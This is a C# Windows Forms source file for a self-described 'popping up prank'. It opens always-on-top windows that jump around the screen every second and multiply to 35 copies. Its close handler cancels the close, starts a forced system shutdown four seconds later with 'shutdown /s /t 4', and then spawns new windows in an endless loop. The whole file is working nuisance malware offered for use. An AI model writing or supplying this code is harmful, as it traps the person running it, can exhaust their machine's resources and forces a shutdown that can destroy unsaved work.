using System.Diagnostics;

namespace popping_up_prank
{

    static class Windows
    {
        public static int windows;
    }


    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.SuspendLayout();
            this.pictureBox.TabIndex = 0;
            this.pictureBox.TabStop = false;
            ((ISupportInitialize)this.pictureBox).EndInit();
            this.TopMost = true;
            this.ResumeLayout(false);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.RandomizePosition();
            new Thread(new ThreadStart(this.Thread)).Start();
        }
        private void Thread()
        {
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
                _ = this.Invoke((Delegate)(() => this.RandomizePosition()));
            }
        }
        private void RandomizePosition()
        {
            Random random = new Random();
            this.Location = new Point((int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Width) - this.Width / 2, (int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Height) - this.Height / 2);
            if (random.Next(0, 10) >= 5)
                return;

            if (Windows.windows >= 35)
            {
                return;
            }
            new Form1().Show();
            Windows.windows += 1;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Process.Start("shutdown", "/s /t 4");
            while (true)
                new Form1().Show();
        }
    }
}
